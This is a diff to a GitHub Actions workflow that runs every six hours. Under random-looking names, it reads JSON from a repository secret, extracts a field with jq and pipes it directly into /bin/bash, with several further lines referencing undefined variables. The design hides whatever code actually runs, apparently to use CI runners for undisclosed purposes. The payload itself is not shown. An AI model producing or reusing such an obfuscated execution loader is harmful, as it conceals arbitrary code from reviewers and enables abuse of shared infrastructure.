@@ -2,28 +2,23 @@ name: hongquanzz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hongquanzz
         env:
-          m61: ${{ secrets.m61 }}
+          hqk877: ${{ secrets.hqk877 }}
         run: |
-          echo $m61 | jq -r .fgwk750 | /bin/bash
-          echo $qolt596 | jq -r .ogj769 | /bin/bash
-          echo $goby63 | jq -r .l5 | /bin/bash
-          echo $jks2 | jq -r .tg26474 | /bin/bash
-          echo $cx574 | jq -r .me42 | /bin/bash
-          echo $m8 | jq -r .xuh034 | /bin/bash
-          echo $ghdux05 | jq -r .bcx908 | /bin/bash
-          echo $laco1218 | jq -r .d62 | /bin/bash
-          echo $png985 | jq -r .g4505 | /bin/bash
-          echo $hrh18 | jq -r .fj7 | /bin/bash
-          echo $jqn047 | jq -r .gxqs05 | /bin/bash
-          echo $oxzoz08626 | jq -r .oqy6 | /bin/bash
-          echo $bgu17 | jq -r .e54287 | /bin/bash
+          echo $hqk877 | jq -r .buz2 | /bin/bash
+          echo $ptoax4460 | jq -r .yui28298 | /bin/bash
+          echo $gqk3 | jq -r .aolr2 | /bin/bash
+          echo $ip2114 | jq -r .bostx51 | /bin/bash
+          echo $me516 | jq -r .rfhzn13 | /bin/bash
+          echo $fj59941 | jq -r .ijcr76670 | /bin/bash
+          echo $pdkf3362 | jq -r .cpvyx4577 | /bin/bash
+          echo $icq05546 | jq -r .esgs944 | /bin/bash
+          echo $qnhi3 | jq -r .kevwe06 | /bin/bash
 
